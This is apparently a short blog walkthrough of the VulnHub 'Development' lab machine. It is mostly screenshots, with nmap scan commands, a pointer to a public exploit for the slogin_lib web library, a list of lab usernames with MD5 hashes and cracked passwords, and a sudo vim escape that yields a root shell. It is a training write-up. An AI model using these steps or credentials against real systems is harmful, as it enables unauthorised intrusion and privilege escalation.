---
layout: post
title:  "vulnhub >_ Development"
description: walkthrough
category: vulnhub
---
# Development



```bash
sudo nmap -Pn -v -p- -sS -T5 192.168.43.16
```



![image-20200609015640191]({{ site.url }}/assets/Development.assets/image-20200609015640191.png)

```bash
sudo nmap -v -T4 -sC -sV -p22,113,139,445,8080 192.168.43.16
```

![image-20200609020305877]({{ site.url }}/assets/Development.assets/image-20200609020305877.png)

![image-20200609020436469]({{ site.url }}/assets/Development.assets/image-20200609020436469.png)

![image-20200609020522951]({{ site.url }}/assets/Development.assets/image-20200609020522951.png)



![image-20200609025850000]({{ site.url }}/assets/Development.assets/image-20200609025850000.png)



![image-20200609030000322]({{ site.url }}/assets/Development.assets/image-20200609030000322.png)



![image-20200609025927392]({{ site.url }}/assets/Development.assets/image-20200609025927392.png)

![image-20200609030308050]({{ site.url }}/assets/Development.assets/image-20200609030308050.png)

![image-20200609034055766]({{ site.url }}/assets/Development.assets/image-20200609034055766.png)

```bash
http://192.168.43.16:8080/developmentsecretpage
```

![image-20200609030352781]({{ site.url }}/assets/Development.assets/image-20200609030352781.png)

![image-20200609033609532]({{ site.url }}/assets/Development.assets/image-20200609033609532.png)

![image-20200609033628979]({{ site.url }}/assets/Development.assets/image-20200609033628979.png)

随便尝试一个密码

![image-20200609033732483]({{ site.url }}/assets/Development.assets/image-20200609033732483.png)

slogin_lib.inc.php

![image-20200609075811498]({{ site.url }}/assets/Development.assets/image-20200609075811498.png)

https://www.exploit-db.com/exploits/7444

![image-20200609082652891]({{ site.url }}/assets/Development.assets/image-20200609082652891.png)



![image-20200609081843908]({{ site.url }}/assets/Development.assets/image-20200609081843908.png)

```bash
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81	12345678900987654321
patrick, 87e6d56ce79af90dbe07d387d3d0579e	P@ssw0rd25
qiu, ee64497098d0926d198f54f6d5431f98		qiu
```

![image-20200609083553230]({{ site.url }}/assets/Development.assets/image-20200609083553230.png)

![image-20200609083648687]({{ site.url }}/assets/Development.assets/image-20200609083648687.png)

![image-20200609083738715]({{ site.url }}/assets/Development.assets/image-20200609083738715.png)



![image-20200609083817145]({{ site.url }}/assets/Development.assets/image-20200609083817145.png)

```bash
patrick@development:/home/intern$ sudo /usr/bin/vim
:! /bin/bash
```

![image-20200609084017496]({{ site.url }}/assets/Development.assets/image-20200609084017496.png)







